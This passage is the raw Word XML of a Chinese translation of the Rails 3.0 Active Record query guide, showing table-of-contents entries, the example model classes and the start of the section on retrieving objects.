    <w:p w14:paraId="472E9CD8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId253" w:anchor="14-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>传递参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6243E2A8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId254" w:anchor="14-3" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>使用作用域</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="615B3F37" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId255" w:anchor="14-4" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>定义默认的作用域</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0495084F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId256" w:anchor="14-5" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>移除所有的作用域</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="646C84AE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId257" w:anchor="15" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>动态查找方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="322AFA14" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId258" w:anchor="16" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>查找并创建一个新对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35C89633" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId259" w:anchor="16-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>first_or_create</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6B37008F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId260" w:anchor="16-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>first_or_create!</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="381D6C94" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId261" w:anchor="16-3" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>first_or_initialize</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5BDB42B4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId262" w:anchor="17" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>直接用</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>SQL</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>语句查找</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="059AE489" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId263" w:anchor="18" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>select_all</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="223E19E3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId264" w:anchor="19" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>pluck</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4373E332" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId265" w:anchor="20" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>检查对象存在性</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FDFC4D0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId266" w:anchor="21" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>计算</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="568E3C9F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId267" w:anchor="21-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>次数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="29B89088" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId268" w:anchor="21-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>平均值</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="288D730C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId269" w:anchor="21-3" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>最小值</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="55834B54" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId270" w:anchor="21-4" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>最大值</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="28EDC9A8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId271" w:anchor="21-5" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>总和</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="455DFA56" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId272" w:anchor="22" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>执行</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>EXPLAIN</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="415999F2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId273" w:anchor="22-1" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>自动化</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>EXPLAIN</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2573B78D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="008938C9" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="56"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId274" w:anchor="22-2" w:history="1">
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>深入了解</w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00AC12D4">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>EXPLAIN</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="63555F82" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这个指导手册是基于 Rails 3.0 的。这里提到的某些代码在其它版本中可能不能工作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3DDC69" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你过去常常使用原始的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句来从数据库中查找数据，那你会发现在 Rails 中，你可以使用更好的方式来达到这个目的。Active Record 使你可以在大多数情况下都避免使用原始的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293D8E59" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>本指导手册中的示例代码会使用如下几个 model ：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398ABCE1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">除非具体指明，否则以下所有的 model 都使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 作为主键。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5664"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="72330F63" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1A7CE7B2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44D156FA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E02A151" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35F37ADD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :roles</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58BD5357" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC12D4" w14:paraId="51EB3A1F" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BE2408D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Address &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21D3372B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :client</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EF82D36" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F53072" w14:paraId="4C6448CB" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D1579C8" w14:textId="77777777" w:rsidR="00F53072" w:rsidRDefault="00F53072" w:rsidP="00F53072">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BEDAA94" w14:textId="77777777" w:rsidR="00F53072" w:rsidRDefault="00F53072" w:rsidP="00F53072">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :client, :counter_cache</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37B596BB" w14:textId="77777777" w:rsidR="00F53072" w:rsidRDefault="00F53072" w:rsidP="00F53072">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F53072" w14:paraId="4BD3F807" w14:textId="77777777" w:rsidTr="00F53072">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E496AD0" w14:textId="77777777" w:rsidR="00F53072" w:rsidRDefault="00F53072" w:rsidP="00F53072">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Role &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="219389F4" w14:textId="77777777" w:rsidR="00F53072" w:rsidRDefault="00F53072" w:rsidP="00F53072">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :clients</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="342007B2" w14:textId="77777777" w:rsidR="00F53072" w:rsidRDefault="00F53072" w:rsidP="00F53072">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4821985E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:rPr>
          <w:vanish/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="211CEC45" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Record 可以帮你执行数据库查询并且兼容大多数数据库系统（ MySQL ， PostgreSQL 和 SQLite 等等）。不管你使用的是什么数据库系统， Active Record 提供的方法的使用方式都是一样的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA0D693" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 从数据库中取对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E54B87E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">为了从数据库中取得对象， Active Record 提供了很多查询方法。每个查询方法都可以通过传递参数来精确控制查询而不需要书写原始 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2336939D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>这些方法有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC9BFB4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="57"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79CC5C24" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
